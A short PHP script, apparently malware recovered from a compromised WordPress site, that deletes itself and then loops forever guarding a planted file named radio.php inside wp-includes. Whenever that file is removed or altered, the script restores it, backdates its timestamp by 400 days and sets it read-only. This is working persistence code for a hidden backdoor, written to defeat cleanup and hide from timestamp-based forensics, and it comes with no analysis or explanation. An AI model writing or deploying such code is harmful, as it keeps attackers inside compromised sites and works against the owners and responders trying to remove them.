<?php
error_reporting(E_ERROR);
set_time_limit(0);
ignore_user_abort(true);
@unlink(__FILE__);
$c = '/home/176584.cloudwaysapps.com/ytdhcvzugr/public_html/wp-includes/Requests/Cookie/radio.php';
$d = file_get_contents($c);
$e = hash('sha1', $d);
do {
    if (!file_exists($c)) {
        @file_put_contents($c, $d);
        @touch($c, strtotime("-400 days"));
        @chmod($c, 0444);
    } else {
        if (hash('sha1', file_get_contents($c)) != $e) {
            @unlink($c);
            @file_put_contents($c, $d);
            @touch($c, strtotime("-400 days"));
            @chmod($c, 0444);
        }
    }
    sleep(1);
} while (true);
exit;
